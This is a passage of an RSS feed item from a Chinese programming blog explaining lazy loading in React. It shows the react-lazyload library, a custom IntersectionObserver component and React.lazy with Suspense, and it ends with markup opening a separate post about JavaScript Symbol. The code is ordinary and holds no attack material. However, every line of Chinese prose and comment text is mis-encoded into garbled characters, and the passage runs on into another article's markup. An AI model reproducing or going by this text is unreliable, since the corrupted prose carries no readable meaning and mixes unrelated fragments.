<p>ç»„ä»¶æ‡’åŠ è½½ç®¡çš„æ˜¯ <strong>â€œä»£ç åŒ…â€</strong>ï¼Œå›¾ç‰‡ / å†…å®¹æ‡’åŠ è½½ç®¡çš„æ˜¯ <strong>â€œå¯è§†åŒºåŸŸå†…æ‰æ¸²æŸ“å†…å®¹â€</strong>ã€‚æˆ‘å¸¸ç”¨çš„æœ‰ä¸¤ç§æ–¹æ¡ˆï¼š</p>
<h4 data-id="heading-3">æ–¹æ¡ˆ 1ï¼šç›´æ¥ç”¨<code>react-lazyload</code>åº“ï¼ˆç°æˆçš„è½®å­ï¼‰</h4>
<blockquote>
<p>ä»“åº“åœ°å€ï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Freact-lazyload" target="_blank" title="https://www.npmjs.com/package/react-lazyload" ref="nofollow noopener noreferrer">www.npmjs.com/package/reaâ€¦</a></p>
<p>ä¸‹è½½æ–¹æ³•ï¼š<code>npm iÂ react-lazyload</code></p>
</blockquote>
<p>å¯¼å…¥çš„<code>LazyLoad</code>å°±æ˜¯è¿™ä¸ªåº“ï¼Œç›´æ¥åŒ…åœ¨å›¾ç‰‡å¤–é¢ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">LazyLoad</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react-lazyload'</span>;

<span class="hljs-comment">// åœ¨App.jsxé‡Œç”¨ï¼š</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">LazyLoad</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">div</span>&gt;</span>å›¾ç‰‡åŠ è½½ä¸­...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>} offset={300}&gt;
    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://xxx.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">LazyLoad</span>&gt;</span></span>
</code></pre>
<ul>
<li><code>placeholder</code>ï¼šå›¾ç‰‡åŠ è½½å‰çš„å ä½å†…å®¹ï¼›</li>
<li><code>offset={300}</code>ï¼š<strong>æå‰ <code>300px</code> å¼€å§‹åŠ è½½å›¾ç‰‡</strong>ï¼ˆç”¨æˆ·è¿˜æ²¡æ»šåˆ°ï¼Œå›¾ç‰‡å·²ç»åœ¨å·å·åŠ è½½äº†ï¼Œä½“éªŒæ›´ä¸æ»‘ï¼‰ã€‚</li>
</ul>
<p><strong>å®Œæ•´ä»£ç </strong>ï¼ˆä¸ºäº†æ›´å¥½å±•ç°æ•ˆæœï¼Œæˆ‘æ”¾äº†<code>50ä¸ªpæ ‡ç­¾</code>ï¼‰ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">LazyLoad</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react-lazyload'</span>;
<span class="hljs-keyword">import</span> { lazy } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-comment">// import Demo from './Demo'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MyLazyLoad</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./MyLazyLoad'</span>

<span class="hljs-comment">// ç»„ä»¶æ²¡æœ‰å‡ºç°åœ¨å¯è§†åŒºåŸŸæ—¶ï¼Œç»„ä»¶ä»£ç éƒ½ä¸ä¼šè¢«åŠ è½½ï¼Œè¢«import('./Demo')åŒ…è£¹çš„æ¨¡å—ä¼šå•ç‹¬æ‰“åŒ…</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Demo</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./Demo'</span>));

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            {/* <span class="hljs-tag">&lt;<span class="hljs-name">Demo</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Demo</span>&gt;</span> */}
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">MyLazyLoad</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">div</span>&gt;</span>loading...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>} width='100px' onContentVisible={() =&gt; console.log('onContentVisible')} onClose={() =&gt; console.log('onClose')}&gt;
                {/* <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://inews.gtimg.com/om_bt/OG4Cnt2SgXAuTj-Vv77ASGszUj1BwOhUXtBCplSlBfQmAAA/641"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span> /&gt;</span> */}
                <span class="hljs-tag">&lt;<span class="hljs-name">Demo</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Demo</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">MyLazyLoad</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">LazyLoad</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">div</span>&gt;</span>loading...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>} offset={300}&gt;
                <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://inews.gtimg.com/om_bt/Os3eJ8u3SgB3Kd-zrRRhgfR5hUvdwcVPKUTNO6O7sZfUwAA/641"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">LazyLoad</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    )
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°æœ€å¼€å§‹çš„ç•Œé¢æ˜¾ç¤ºçš„éƒ½æ˜¯<code>loading</code>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/472d2993a5bb4c7b82b6c4e40bfbd34b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383635&amp;x-signature=UDniOk3un5bQLC4vc%2FTBlMsinSY%3D" alt="image.png" loading="lazy"/></p>
<p>æˆ‘ä»¬æ…¢æ…¢å¾€ä¸‹æ»‘ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea721eb3b5e941a69e984f10ce57b087~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383635&amp;x-signature=kJDZtnXss1lPAyw7GcRxCgmoZlI%3D" alt="image.png" loading="lazy"/></p>
<p>æ»‘åˆ°<code>Demo</code>å’Œ <code>ç…§ç‰‡</code>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3df5a6ced8544f5ebc42a19fc55df975~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383635&amp;x-signature=QA3g6ka2x%2Fh01P01DZ2EFc47c0o%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-4">æ–¹æ¡ˆ 2ï¼šè‡ªå·±å†™ä¸€ä¸ªæ‡’åŠ è½½ç»„ä»¶ï¼ˆæ¯”å¦‚æˆ‘è‡ªå·±å†™çš„<code>MyLazyLoad.jsx</code>ï¼‰</h4>
<p>æˆ‘å†™çš„<code>MyLazyLoad</code>ç»„ä»¶ï¼Œæ ¸å¿ƒå°±æ˜¯ç”¨<code>IntersectionObserver</code>å®ç° <strong>â€œå¯è§†åŒºåŸŸæ£€æµ‹â€</strong>ï¼Œé€»è¾‘å’Œä¹‹å‰æ™®é€šç½‘é¡µçš„æ‡’åŠ è½½æ˜¯é€šçš„ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// MyLazyLoad.jsxæ ¸å¿ƒä»£ç </span>
<span class="hljs-keyword">import</span> { useState, useRef, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">MyLazyLoad</span>(<span class="hljs-params">props</span>) {
    <span class="hljs-keyword">const</span> { placeholder, children, offset, onContentVisible } = props;
    <span class="hljs-keyword">const</span> [visible, setVisible] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
    <span class="hljs-keyword">const</span> containerRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);
    <span class="hljs-keyword">const</span> elementObserver = <span class="hljs-title function_">useRef</span>();

    <span class="hljs-comment">// åˆå§‹åŒ–IntersectionObserver</span>
    <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-keyword">const</span> options = {
            <span class="hljs-attr">threshold</span>: <span class="hljs-number">0</span>,
            <span class="hljs-attr">rootMargin</span>: <span class="hljs-keyword">typeof</span> offset === <span class="hljs-string">'number'</span> ? <span class="hljs-string">`<span class="hljs-subst">${offset}</span>px`</span> : <span class="hljs-string">'0px'</span>
        };
        <span class="hljs-comment">// ç›‘å¬å…ƒç´ æ˜¯å¦è¿›å…¥å¯è§†åŒºåŸŸ</span>
        elementObserver.<span class="hljs-property">current</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntersectionObserver</span>(lazyLoadHandler, options);
        <span class="hljs-keyword">const</span> node = containerRef.<span class="hljs-property">current</span>;
        elementObserver.<span class="hljs-property">current</span>.<span class="hljs-title function_">observe</span>(node);

        <span class="hljs-comment">// å¸è½½æ—¶åœæ­¢ç›‘å¬</span>
        <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
            elementObserver.<span class="hljs-property">current</span>.<span class="hljs-title function_">unobserve</span>(node);
        };
    }, []);

    <span class="hljs-comment">// å…ƒç´ è¿›å…¥å¯è§†åŒºåŸŸåçš„å¤„ç†</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">lazyLoadHandler</span>(<span class="hljs-params">entries</span>) {
        <span class="hljs-keyword">const</span> [entry] = entries;
        <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">isIntersecting</span>) {
            <span class="hljs-title function_">setVisible</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">// æ˜¾ç¤ºçœŸå®å†…å®¹</span>
            onContentVisible?.(); <span class="hljs-comment">// è§¦å‘â€œå†…å®¹å¯è§â€çš„å›è°ƒ</span>
            elementObserver.<span class="hljs-property">current</span>.<span class="hljs-title function_">unobserve</span>(containerRef.<span class="hljs-property">current</span>); <span class="hljs-comment">// åœæ­¢ç›‘å¬</span>
        }
    }

    <span class="hljs-comment">// æ²¡è¿›å…¥å¯è§†åŒºåŸŸå°±æ˜¾ç¤ºå ä½ï¼Œè¿›å…¥äº†å°±æ˜¾ç¤ºçœŸå®å†…å®¹</span>
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{containerRef}</span>&gt;</span>
            {visible ? children : placeholder}
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}
</code></pre>
<p>ç”¨çš„æ—¶å€™å’Œ<code>react-lazyload</code>å·®ä¸å¤šï¼ŒæŠŠè¦æ‡’åŠ è½½çš„å†…å®¹åŒ…è¿›å»ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">&lt;<span class="hljs-title class_">MyLazyLoad</span> placeholder={<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>åŠ è½½ä¸­...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>} offset={<span class="hljs-number">300</span>}&gt;
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://xxx.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span> /&gt;</span></span>
    {<span class="hljs-comment">/* ç”šè‡³å¯ä»¥åŒ…ç»„ä»¶ï¼š&lt;Demo /&gt; */</span>}
&lt;/<span class="hljs-title class_">MyLazyLoad</span>&gt;
</code></pre>
<h3 data-id="heading-5">ä¸‰ã€â€œç»„ä»¶æ‡’åŠ è½½â€+â€œå†…å®¹æ‡’åŠ è½½â€ï¼šåŒå‰‘åˆç’§</h3>
<p>æŠŠå‰é¢çš„æŠ€æœ¯ç»“åˆèµ·æ¥ï¼Œå°±æ˜¯ <code>React é¡¹ç›®</code>é‡Œçš„ <strong>â€œç»ˆææ‡’åŠ è½½â€</strong>ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">import</span> { lazy, <span class="hljs-title class_">Suspense</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MyLazyLoad</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./MyLazyLoad'</span>;

<span class="hljs-comment">// ç»„ä»¶ä»£ç æ‡’åŠ è½½</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Demo</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./Demo'</span>));
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            {/* ä¸€å †å†…å®¹... */}
            {/* ç»„ä»¶ä»£ç +ç»„ä»¶å†…å®¹ éƒ½æ‡’åŠ è½½ */}
            <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">div</span>&gt;</span>ç»„ä»¶åŒ…åŠ è½½ä¸­...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}&gt;
                <span class="hljs-tag">&lt;<span class="hljs-name">MyLazyLoad</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">div</span>&gt;</span>ç»„ä»¶å†…å®¹åŠ è½½ä¸­...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}&gt;
                    <span class="hljs-tag">&lt;<span class="hljs-name">Demo</span> /&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">MyLazyLoad</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}
</code></pre>
<ul>
<li><strong>ç¬¬ä¸€æ­¥</strong>ï¼šç”¨æˆ·æ»‘åˆ° <code>Demo åŒºåŸŸå‰</code>ï¼Œ<code>Demo</code>çš„ä»£ç åŒ…<strong>ä¸ä¼šä¸‹è½½</strong>ï¼›</li>
<li><strong>ç¬¬äºŒæ­¥</strong>ï¼šä»£ç åŒ…ä¸‹è½½å®Œæˆåï¼Œ<code>MyLazyLoad</code>ä¼šç­‰ Demo <strong>è¿›å…¥å¯è§†åŒºåŸŸ</strong>ï¼Œå†æ¸²æŸ“ Demo çš„å†…å®¹ï¼›</li>
<li><strong>å…¨ç¨‹éƒ½æœ‰å ä½æç¤ºï¼Œç”¨æˆ·ä¸ä¼šçœ‹åˆ° â€œç©ºç™½â€ æˆ– â€œæŠ¥é”™â€</strong>ã€‚</li>
</ul>
<h3 data-id="heading-6">å››ã€æ€»ç»“</h3>
<ul>
<li><strong>React æ‡’åŠ è½½åˆ†ä¸¤ç±»</strong>ï¼š<code>React.lazy</code>+<code>Suspense</code>å®ç°<strong>ç»„ä»¶ä»£ç æŒ‰éœ€ä¸‹è½½</strong>ï¼Œ<code>react-lazyload</code>/ è‡ªå®šä¹‰ç»„ä»¶å®ç°<strong>å†…å®¹æŒ‰éœ€æ¸²æŸ“</strong>ã€‚</li>
<li><strong>æ ¸å¿ƒä»·å€¼</strong>ï¼šå‡å°‘åˆå§‹åŒ–èµ„æºå¼€é”€ï¼Œæå‡é¡µé¢åŠ è½½å’Œæ¸²æŸ“æ€§èƒ½ã€‚</li>
</ul>
<h2 data-id="heading-7">ç»“è¯­</h2>
<p><strong>æ™®é€šç½‘é¡µçš„æ‡’åŠ è½½</strong>æ˜¯è®©å›¾ç‰‡ <code>â€œæ‘¸é±¼â€</code>ï¼Œ<strong>React çš„æ‡’åŠ è½½</strong>åˆ™æ˜¯ç»™ç»„ä»¶å’Œä»£ç éƒ½å‘äº† <code>â€œæ‘¸é±¼è®¸å¯è¯â€</code>â€”â€” ä¸ç”¨ä¸€å¼€åœºå°±å…¨å‘˜åˆ°å²—ï¼Œè¯¥èººå¹³æ—¶èººå¹³ï¼Œè¯¥å¹²æ´»æ—¶å†å‘åŠ›ã€‚</p>
<p>å°±å¥½æ¯”ç»è¥ä¸€å®¶åº—ï¼Œ<strong>ä¸ç”¨æŠŠæ‰€æœ‰å•†å“éƒ½å †åœ¨é—¨å£</strong> <code>ï¼ˆåˆå§‹åŒ–åŠ è½½æ‰€æœ‰ä»£ç ï¼‰</code>ï¼Œè€Œæ˜¯<strong>æŠŠæš‚æ—¶æ²¡äººè¦çš„å•†å“æ”¾è¿›ä»“åº“</strong> <code>ï¼ˆå•ç‹¬æ‰“åŒ…ç»„ä»¶ï¼‰</code>ï¼Œç­‰é¡¾å®¢é—®åˆ°äº†å†å–å‡ºæ¥ï¼Œæ‘†ä¸Šè´§æ¶<code>ï¼ˆæ¸²æŸ“å†…å®¹ï¼‰</code>â€”â€” æ—¢<strong>çœäº†é—¨å£çš„ç©ºé—´</strong> <code>ï¼ˆé¡µé¢åŠ è½½æ€§èƒ½ï¼‰</code>ï¼Œåˆä¸ä¼šè®©é¡¾å®¢ç­‰å¤ªä¹… <code>ï¼ˆä¼˜åŒ–ç”¨æˆ·ä½“éªŒï¼‰</code>ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸŒŸ JavaScript `Symbol` å…¨é¢å­¦ä¹ ç¬”è®°ï¼ˆES6+ï¼‰]]></title>    <link>https://juejin.cn/post/7600990891218681865</link>    <guid>https://juejin.cn/post/7600990891218681865</guid>    <pubDate>2026-01-30T13:36:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600990891218681865" data-draft-id="7601028900885594158" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸŒŸ JavaScript `Symbol` å…¨é¢å­¦ä¹ ç¬”è®°ï¼ˆES6+ï¼‰"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2026-01-30T13:36:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸ä¼šæ•²ä»£ç 1"/> <meta itemprop="url" content="https://juejin.cn/user/1927884034804425"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸŒŸ JavaScript `Symbol` å…¨é¢å­¦ä¹ ç¬”è®°ï¼ˆES6+ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1927884034804425/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸ä¼šæ•²ä»£ç 1
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:36:39.000Z" title="Fri Jan 30 2026 13:36:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
